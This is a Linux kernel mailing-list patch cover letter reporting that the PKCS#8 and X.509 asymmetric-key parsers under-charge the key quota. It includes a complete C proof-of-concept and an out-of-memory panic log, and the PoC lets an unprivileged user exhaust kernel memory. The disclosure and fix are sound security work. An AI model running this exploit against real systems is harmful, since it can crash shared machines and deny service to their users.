Received: from mail-pz2-f21.google.com (mail-pz2-f21.google.com [74.125.228.21])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 1B31A364EB2
	for <linux-crypto@vger.kernel.org>; Sat, 19 Sep 2026 08:46:14 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.21
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789807576; cv=none; b=mTfp+O3uNPt53no/ap1hiDA1+WRHNS4U+jsIYvvlG+4k6J55nMZpDS/JgOCuJB7zXloWQX2YFkD9EwQYgKjopQPvetUrCbgWLW+N0o1x5eVE54l6UNGiBJphPi4FJO6W2r6HbyxtcVf7rI30Q0R48jCGveuWWNXbrJZNm54lfSI=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789807576; c=relaxed/simple;
	bh=BL/zeeS9PlU11y46O+fMur+gNoev984KLWe0pALA/pQ=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=sJwgIYPFwlItWb1emOb+l5Y0tuKqUMXa70RN+cOx4DU1986h/udZccIVmlj87CjLmYWzl2/ty2J3vFS23ivPbGuExsvIHuNbg7X0MX+z+DqnNCYkNBCb71ZDhG5CinYSsBPw1LtxQ3Dth0IXZIruyTMjPkc2pbw+hYba/xW7EcU=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=lkbNoZ6U; arc=none smtp.client-ip=74.125.228.21
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="lkbNoZ6U"
Received: by mail-pz2-f21.google.com with SMTP id 41be03b00d2f7-cc4cacd3409so1660751a12.2
        for <linux-crypto@vger.kernel.org>; Sat, 19 Sep 2026 01:46:14 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1789807574; x=1790412374; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=YUu/lRQGAG8FHMHbB8+mlasCEqI53+jgyp91Gu8REJ0=;
        b=lkbNoZ6UEK2eejJVuudLwG68ZMO3+B24kpod+5y7otTXWn50mfx1HUV0+sMWfoKrvC
         VG24yq8bzys8bEzoEG9OQcq+glZgTJlMca1JsmkovDpWFGk4VEurELjk6NIiu4O5Cao7
         fPwP1dCiycWQx2TBpBi/OBg+t6VL+gEGRoLR1qvvaB+sNq+v5kS6VsGryHj8SOhVVR87
         ttMewljb8SelN4Y2ZWgC0R68rkzZwFZ2zmFaJYYnvN8DBePWygU+IWKJqxfb3mTW8Ocz
         q6ruK+wqDUnknqI18vpLhnVsrmRhAQvBYP7VTXj8tVmNpcgNqPs8dsyr6VHJBKuXEeEp
         YIoQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1789807574; x=1790412374;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=YUu/lRQGAG8FHMHbB8+mlasCEqI53+jgyp91Gu8REJ0=;
        b=dHdBS90QssTdBxhEcMtp+52kjmio6IyI2PxWP7rmIp+iceoHPs0Or4bWs36VbEaPjP
         4nS3ihEav9Luu1SaB9eO0JD1XQLCctdoDUkVtia6lkdow+Kyc3wQ0wMbHkwyRjOI05YI
         Xxm/wliDTY3e6zc8KS7XAxGtXrayjl3Zxlafi/EKYjpSZomJzAIFQENKCC+sk0+KYMZ4
         VZk0k7+k4XE9RW/0ZtcuyhvPFQelhhPMk8WX3uIZUu8bNQLQs3pgZ6/EmsgMSogZXaoz
         RnjDFGiI6NM52DbSCXvEM069p4ptXRPP8AD5ZqqSGh7Fl/mJJ/t3biiroyDX/o3U5Zeb
         9S0A==
X-Gm-Message-State: AFuF++khNcXS+nmACtN6qlF+0WWalZ8kIJ3x66gPAxjMhmYx2irIsPu4
	LmhFI3D4VMTwmI+CynEhcTWZraStPnG1juKcSUDpuLFU8gIt4d4GETICcDxYMw==
X-Gm-Gg: AYBFou2l6M2cNMMQz/j2J+WIyjOnIeeLPuQNxtPNDAJH2+eeUYURdnVyKGkffpjXztO
	RWH38dKHV9nbqf6p4VNe6E0qJYKZOcdIxvQWIK1ift8pAVMubggRyTOJIViSAFoB1uQcU6IkHqK
	JehLZxW8IE76MwUQrDYdqWnO+NIBvGRFn8Nop33ECI5Im2txKtiV8OZLtatotJIoPO7rp0QiXjx
	d6gP0K/TjhRrmpFj3IrdVGG/RTRVJfu/zT/YpcSgfZbN4OAIUVgE5sR9JMY8864Zyo9Z1yGIpsJ
	BXrcyDu11Mt+epBnvo0JwYPSTV5tNA/Z3P+5WffQITBPwV5e8TInSDRAm4NHfRU6R706ZZgmgp6
	TyQ3zsCyp15SZH8AT1qhAf2jG0cNil19b4iZJQcMOlAUkjYLU8cPO0o3Ea0tJcrn2Jkv2pbUzH+
	dc7lnzD2zn1X1bD7yw/kKih38hjhDwruzalNp55mOkRJD5TRyjr+Mwa5t4IsyUbHk3jBLDY7u5D
	M3xP5hwicSrZZ28uUrg5vSkxgZLPtsCVOUUp3SbR89JtYCRbIH4gA6vRkstSCUFlWLe5g==
X-Received: by 2002:a17:90b:3a81:b0:39e:6a82:afd9 with SMTP id 98e67ed59e1d1-39e6a82bbe2mr3367358a91.43.1789807574075;
        Sat, 19 Sep 2026 01:46:14 -0700 (PDT)
Received: from lenovo-thinkbook (42-2-127-248.static.netvigator.com. [42.2.127.248])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39e6cae997csm3490897a91.11.2026.09.19.01.46.10
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 19 Sep 2026 01:46:13 -0700 (PDT)
From: Yuqi Xu <xuyuqiabc@gmail.com>
To: linux-crypto@vger.kernel.org
Cc: David Howells <dhowells@redhat.com>,
	Lukas Wunner <lukas@wunner.de>,
	Ignat Korchagin <ignat@linux.win>,
	Herbert Xu <herbert@gondor.apana.org.au>,
	"David S . Miller" <davem@davemloft.net>,
	keyrings@vger.kernel.org,
	stable@vger.kernel.org,
	Vega <vega@nebusec.ai>,
	Ren Wei <weir@nebusec.ai>,
	xuyq21@lenovo.com
Subject: [PATCH 0/1] KEYS: Account for asymmetric key payload data in the quota
Date: Sat, 19 Sep 2026 16:45:57 +0800
Message-ID: <cover.1789801335.git.xuyuqiabc@gmail.com>
X-Mailer: git-send-email 2.55.0
Precedence: bulk
X-Mailing-List: linux-crypto@vger.kernel.org
List-Id: <linux-crypto.vger.kernel.org>
List-Subscribe: <mailto:linux-crypto+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-crypto+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable

Hi Linux kernel maintainers,

We found and validated an issue in
crypto/asymmetric_keys/pkcs8_parser.c.  The bug is reachable by a
non-root user through add_key("asymmetric", ...); it does not require a
user or network namespace.  We've tested the fix and it should not
affect other functionality.

We will provide detailed information about the bug in this email, along
with a reproducer.

---- details below ----

Bug details:

add_key("asymmetric", ...) preparses the supplied blob with the
registered asymmetric key parsers and then instantiates the key with
generic_key_instantiate(), which charges prep->quotalen to the owning
user's key quota through key_payload_reserve().

pkcs8_parse() ASN.1-decodes the outer PKCS#8 structure and duplicates
the attacker-controlled PrivateKey OCTET STRING with
kmemdup(ctx.key, ctx.key_size, GFP_KERNEL) into pub->key.
pkcs8_key_preparse() then stores that object persistently in the
asymmetric-key payload, but hard-codes

    prep->quotalen =3D 100;

so the quota records only 100 bytes regardless of the retained private
key size.  The ASN.1 decoder accepts blobs up to 65535 bytes, so one key
can pin about 64 KiB of kernel memory while consuming 100 quota bytes.
With the default non-root limits (200 keys / 20000 bytes) a user can
retain roughly 12 MiB of kernel memory instead of the 20 KiB the limit
is meant to allow.

x509_key_preparse() has the same problem: it keeps the parsed public
key, its parameters, the signature, the key IDs and the authority key
IDs, but also charges a fixed 100 bytes.  The same add_key() call
reaches the X.509 parser, so fixing only PKCS#8 would leave the bypass
reachable; the patch accounts
for the retained payload in both parsers.

Measured on v7.3-rc1 (10396a2d6d41), 2 vCPU / 2 GiB QEMU guest.  The
test drops to uid 1000 and adds PKCS#8 keys with a 65000-byte
PrivateKey field through add_key("asymmetric", ...):

Before the patch (/proc/key-users, uid 1000):
  1000:     5 5/5 5/200 259/20000
  added 176 keys; last add_key: -1 errno=3D122 (Disk quota exceeded)
  1000:   182 182/181 181/200 19971/20000
176 keys retained about 11.4 MiB of kernel memory, but were charged only
19971 - 259 =3D 19712 bytes in total, about 112 bytes per key.

After the patch:
  1000:     5 5/5 5/200 1139/20000
  added 0 keys; last add_key: -1 errno=3D122 (Disk quota exceeded)
The oversized key is rejected immediately, while a small PKCS#8 key
(200-byte PrivateKey) still loads and is charged 264 bytes.

The same holds for a small X.509 certificate whose only large object is
a 26000-byte authorityKeyIdentifier key ID: the patch rejects it, while
the unpatched kernel accepted it and charged 109 bytes.

The panic log below was captured by the report during the initial
validation.

Reproducer:

  gcc -O2 -static -o poc poc.c
  ./poc

Run the PoC as an unprivileged user; no namespace is needed.  We run it
in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

#define _GNU_SOURCE

#include <errno.h>
#include <inttypes.h>
#include <linux/keyctl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

typedef int32_t key_serial_t;

struct options {
	size_t payload_size;
	size_t key_count;
	size_t anon_mb;
	unsigned pause_secs;
	bool revoke_on_exit;
};

static void usage(const char *prog)
{
	fprintf(stderr,
		"Usage: %s [--payload-size BYTES] [--key-count N] [--anon-mb MB]\n"
		"          [--pause SECS] [--revoke-on-exit]\n",
		prog);
}

static size_t der_len_bytes(size_t len)
{
	size_t n =3D 0;

	if (len < 0x80)
		return 1;

	while (len) {
		n++;
		len >>=3D 8;
	}

	return 1 + n;
}

static size_t der_put_len(unsigned char *dst, size_t len)
{
	size_t n =3D 0;
	size_t tmp =3D len;

	if (len < 0x80) {
		dst[0] =3D (unsigned char)len;
		return 1;
	}

	while (tmp) {
		n++;
		tmp >>=3D 8;
	}

	dst[0] =3D 0x80 | n;
	for (size_t i =3D 0; i < n; i++)
		dst[1 + i] =3D (unsigned char)(len >> ((n - 1 - i) * 8));

	return 1 + n;
}

static unsigned char *build_pkcs8(size_t payload_size, size_t *blob_len_out)
{
	static const unsigned char algo_id[] =3D {
		0x30, 0x0d,
		0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7,
		0x0d, 0x01, 0x01, 0x01,
		0x05, 0x00,
	};
	const size_t octet_total =3D 1 + der_len_bytes(payload_size) + payload_siz=
e;
	const size_t seq_content_len =3D 3 + sizeof(algo_id) + octet_total;
	const size_t blob_len =3D 1 + der_len_bytes(seq_content_len) + seq_content=
_len;
	unsigned char *blob;
	unsigned char *p;

	blob =3D malloc(blob_len);
	if (!blob)
		return NULL;

	p =3D blob;
	*p++ =3D 0x30;
	p +=3D der_put_len(p, seq_content_len);

	*p++ =3D 0x02;
	*p++ =3D 0x01;
	*p++ =3D 0x00;

	memcpy(p, algo_id, sizeof(algo_id));
	p +=3D sizeof(algo_id);

	*p++ =3D 0x04;
	p +=3D der_put_len(p, payload_size);

	for (size_t i =3D 0; i < payload_size; i++)
		p[i] =3D (unsigned char)(i * 131u + 7u);
	p +=3D payload_size;

	if ((size_t)(p - blob) !=3D blob_len) {
		fprintf(stderr, "internal length mismatch: %zu !=3D %zu\n",
			(size_t)(p - blob), blob_len);
		free(blob);
		return NULL;
	}

	*blob_len_out =3D blob_len;
	return blob;
}

static long add_key_syscall(const char *type, const char *desc,
			    const void *payload, size_t plen,
			    key_serial_t ringid)
{
	return syscall(SYS_add_key, type, desc, payload, plen, ringid);
}

static long keyctl_syscall(int cmd, unsigned long arg2, unsigned long arg3,
			   unsigned long arg4, unsigned long arg5)
{
	return syscall(SYS_keyctl, cmd, arg2, arg3, arg4, arg5);
}

static void *spray_anon(size_t anon_mb)
{
	const size_t bytes =3D anon_mb * 1024ULL * 1024ULL;
	const long page_size =3D sysconf(_SC_PAGESIZE);
	unsigned char *mapping;

	if (!anon_mb)
		return NULL;

	mapping =3D mmap(NULL, bytes, PROT_READ | PROT_WRITE,
		       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (mapping =3D=3D MAP_FAILED) {
		perror("mmap anon");
		return NULL;
	}

	for (size_t off =3D 0; off < bytes; off +=3D (size_t)page_size)
		mapping[off] =3D (unsigned char)(off / (size_t)page_size);

	printf("[*] touched %zu MiB of anonymous memory\n", anon_mb);
	fflush(stdout);
	return mapping;
}

static unsigned long parse_u64(const char *name, const char *value)
{
	char *end =3D NULL;
	unsigned long long out;

	errno =3D 0;
	out =3D strtoull(value, &end, 0);
	if (errno || !end || *end) {
		fprintf(stderr, "bad value for %s: %s\n", name, value);
		exit(1);
	}

	return (unsigned long)out;
}

int main(int argc, char **argv)
{
	struct options opt =3D {
		.payload_size =3D 65000,
		.key_count =3D 178,
		.anon_mb =3D 700,
		.pause_secs =3D 0,
		.revoke_on_exit =3D false,
	};
	unsigned char *blob =3D NULL;
	size_t blob_len =3D 0;
	key_serial_t *serials =3D NULL;
	void *anon_mapping =3D NULL;
	size_t added =3D 0;
	char ring_name[64];
	int ret =3D 0;

	for (int i =3D 1; i < argc; i++) {
		if (!strcmp(argv[i], "--payload-size") && i + 1 < argc) {
			opt.payload_size =3D parse_u64("--payload-size", argv[++i]);
		} else if (!strcmp(argv[i], "--key-count") && i + 1 < argc) {
			opt.key_count =3D parse_u64("--key-count", argv[++i]);
		} else if (!strcmp(argv[i], "--anon-mb") && i + 1 < argc) {
			opt.anon_mb =3D parse_u64("--anon-mb", argv[++i]);
		} else if (!strcmp(argv[i], "--pause") && i + 1 < argc) {
			opt.pause_secs =3D parse_u64("--pause", argv[++i]);
		} else if (!strcmp(argv[i], "--revoke-on-exit")) {
			opt.revoke_on_exit =3D true;
		} else {
			usage(argv[0]);
			return 1;
		}
	}

	if (opt.payload_size > (1024U * 1024U - 128U)) {
		fprintf(stderr, "payload too large for add_key limit\n");
		return 1;
	}

	blob =3D build_pkcs8(opt.payload_size, &blob_len);
	if (!blob) {
		perror("build_pkcs8");
		return 1;
	}

	serials =3D calloc(opt.key_count, sizeof(*serials));
	if (!serials) {
		perror("calloc serials");
		free(blob);
		return 1;
	}

	snprintf(ring_name, sizeof(ring_name), "pkcs8-n6q-%ld", (long)getpid());
	if (keyctl_syscall(KEYCTL_JOIN_SESSION_KEYRING,
			   (unsigned long)ring_name, 0, 0, 0) < 0) {
		perror("keyctl join_session_keyring");
		ret =3D 1;
		goto out;
	}

	printf("[*] payload_size=3D%zu blob_len=3D%zu key_count=3D%zu anon_mb=3D%z=
u\n",
	       opt.payload_size, blob_len, opt.key_count, opt.anon_mb);
	fflush(stdout);

	anon_mapping =3D spray_anon(opt.anon_mb);
	if (opt.anon_mb && !anon_mapping) {
		ret =3D 1;
		goto out;
	}

	for (size_t i =3D 0; i < opt.key_count; i++) {
		char desc[32];
		long serial;

		snprintf(desc, sizeof(desc), "k%06zu", i);
		serial =3D add_key_syscall("asymmetric", desc, blob, blob_len,
					 KEY_SPEC_SESSION_KEYRING);
		if (serial < 0) {
			fprintf(stderr,
				"[!] add_key failed after %zu keys: errno=3D%d (%s)\n",
				added, errno, strerror(errno));
			ret =3D 1;
			goto out;
		}

		serials[added++] =3D (key_serial_t)serial;
		if ((added % 10) =3D=3D 0 || added =3D=3D 1) {
			printf("[+] added %zu keys, last serial=3D%ld\n",
			       added, serial);
			fflush(stdout);
		}
	}

	printf("[+] completed %zu successful add_key calls\n", added);
	fflush(stdout);

	if (opt.pause_secs) {
		printf("[*] sleeping for %u seconds\n", opt.pause_secs);
		fflush(stdout);
		sleep(opt.pause_secs);
	}

out:
	if (opt.revoke_on_exit) {
		for (size_t i =3D 0; i < added; i++)
			keyctl_syscall(KEYCTL_REVOKE, serials[i], 0, 0, 0);
	}

	if (anon_mapping)
		munmap(anon_mapping, opt.anon_mb * 1024ULL * 1024ULL);
	free(serials);
	free(blob);
	return ret;
}

------END poc.c--------

----BEGIN crash log----

[  291.603731][T10195] Kernel panic - not syncing: Out of memory: compulsor=
y panic_on_oom is enabled=0D=0D
[  291.604425][T10195] CPU: 1 UID: 1028 PID: 10195 Comm: poc Not tainted 6.=
12.74 #3=0D=0D
[  291.604946][T10195] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, =
1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014=0D=0D
[  291.605646][T10195] Call Trace:=0D=0D
[  291.605889][T10195]  <TASK>=0D=0D
[  291.606112][T10195]  dump_stack_lvl+0x3b/0x1f0=0D=0D
[  291.606466][T10195]  panic+0x6fe/0x7e0=0D=0D
[  291.606767][T10195]  ? dump_header+0x6c2/0x950=0D=0D
[  291.607117][T10195]  ? __pfx_panic+0x10/0x10=0D=0D
[  291.607458][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5=0D=0D
[  291.607883][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5=0D=0D
[  291.608335][T10195]  ? out_of_memory+0x8c5/0x16b0=0D=0D
[  291.608714][T10195]  out_of_memory+0x8f3/0x16b0=0D=0D
[  291.609092][T10195]  ? __pfx_out_of_memory+0x10/0x10=0D=0D
[  291.609483][T10195]  ? lock_acquire+0x2f/0xb0=0D=0D
[  291.609824][T10195]  ? __alloc_pages_noprof+0xd59/0x26d0=0D=0D
[  291.610258][T10195]  __alloc_pages_noprof+0x1ec3/0x26d0=0D=0D
[  291.610688][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5=0D=0D
[  291.611102][T10195]  ? hlock_class+0x4e/0x130=0D=0D
[  291.611463][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5=0D=0D
[  291.611885][T10195]  ? __pfx___alloc_pages_noprof+0x10/0x10=0D=0D
[  291.612350][T10195]  ? __pfx___lock_acquire+0x10/0x10=0D=0D
[  291.612755][T10195]  ? __sanitizer_cov_trace_switch+0x54/0x90=0D=0D
[  291.613198][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5=0D=0D
[  291.613615][T10195]  ? policy_nodemask+0xf2/0x4f0=0D=0D
[  291.613993][T10195]  alloc_pages_mpol_noprof+0x2ce/0x610=0D=0D
[  291.614417][T10195]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10=0D=0D
[  291.614859][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5=0D=0D
[  291.615294][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5=0D=0D
[  291.615709][T10195]  ? xas_load+0x49/0x5b0=0D=0D
[  291.616038][T10195]  ? filemap_get_entry+0xd5/0x3c0=0D=0D
[  291.616444][T10195]  folio_alloc_noprof+0x23/0xd0=0D=0D
[  291.616820][T10195]  filemap_alloc_folio_noprof+0x35d/0x420=0D=0D
[  291.617244][T10195]  ? __pfx_filemap_alloc_folio_noprof+0x10/0x10=0D=0D
[  291.617694][T10195]  ? filemap_fault+0x631/0x2800=0D=0D
[  291.618086][T10195]  __filemap_get_folio+0x53e/0xaf0=0D=0D
[  291.618499][T10195]  filemap_fault+0x675/0x2800=0D=0D
[  291.618878][T10195]  ? __pfx_filemap_fault+0x10/0x10=0D=0D
[  291.619284][T10195]  ? do_pte_missing+0x165a/0x3ff0=0D=0D
[  291.619662][T10195]  ? __pfx_lock_release+0x10/0x10=0D=0D
[  291.620055][T10195]  ? __pfx_filemap_map_pages+0x10/0x10=0D=0D
[  291.620471][T10195]  __do_fault+0x10f/0x4a0=0D=0D
[  291.620800][T10195]  ? __pfx_filemap_map_pages+0x10/0x10=0D=0D
[  291.621210][T10195]  do_pte_missing+0x174c/0x3ff0=0D=0D
[  291.621585][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5=0D=0D
[  291.622002][T10195]  ? reacquire_held_locks+0x20b/0x4c0=0D=0D
[  291.622399][T10195]  ? lock_vma_under_rcu+0x143/0x980=0D=0D
[  291.622797][T10195]  __handle_mm_fault+0xfa3/0x2a10=0D=0D
[  291.623201][T10195]  ? __pfx_lock_release+0x10/0x10=0D=0D
[  291.623574][T10195]  ? down_read_trylock+0x1f0/0x3f0=0D=0D
[  291.623959][T10195]  ? __pfx___handle_mm_fault+0x10/0x10=0D=0D
[  291.624373][T10195]  ? __pfx_down_read_trylock+0x10/0x10=0D=0D
[  291.624818][T10195]  ? __pfx_lock_vma_under_rcu+0x10/0x10=0D=0D
[  291.625252][T10195]  handle_mm_fault+0x3f5/0xa00=0D=0D
[  291.625639][T10195]  do_user_addr_fault+0x50a/0x1490=0D=0D
[  291.626067][T10195]  exc_page_fault+0x5d/0xe0=0D=0D
[  291.626421][T10195]  asm_exc_page_fault+0x26/0x30=0D=0D
[  291.626781][T10195] RIP: 0033:0x7f7f7505e080=0D=0D
[  291.627107][T10195] Code: Unable to access opcode bytes at 0x7f7f7505e05=
6.=0D=0D
[  291.627583][T10195] RSP: 002b:00007ffc585a1b08 EFLAGS: 00010202=0D=0D
[  291.628015][T10195] RAX: 00007ffc585a2120 RBX: 00007ffc585a2040 RCX: 000=
0000000000002=0D=0D
[  291.628553][T10195] RDX: 00007ffc585a2100 RSI: 0000000000000025 RDI: 000=
0560a6a8580a7=0D=0D
[  291.629082][T10195] RBP: 00007ffc585a2210 R08: 00007ffc585a2230 R09: 000=
0000000000058=0D=0D
[  291.629623][T10195] R10: 00007ffc585a2210 R11: 0000000000000246 R12: 000=
0560a6bf4d2a0=0D=0D
[  291.630161][T10195] R13: 0000560a6bf5d0b0 R14: 00007ffc585a2100 R15: 000=
0560a6a8580a7=0D=0D
[  291.630738][T10195]  </TASK>=0D=0D
[  291.631265][T10195] Kernel Offset: disabled=0D=0D
[  291.631642][T10195] Rebooting in 86400 seconds..=0D=0D

-----END crash log-----

Best regards,
Yuqi Xu

Yuqi Xu (1):
  KEYS: Account for asymmetric key payload data in the quota

 crypto/asymmetric_keys/pkcs8_parser.c    |  2 +-
 crypto/asymmetric_keys/x509_public_key.c | 23 ++++++++++++++++++++++-
 2 files changed, 23 insertions(+), 2 deletions(-)


base-commit: 10396a2d6d41d594975b6ece712278570c3c970c
--=20
2.55.0

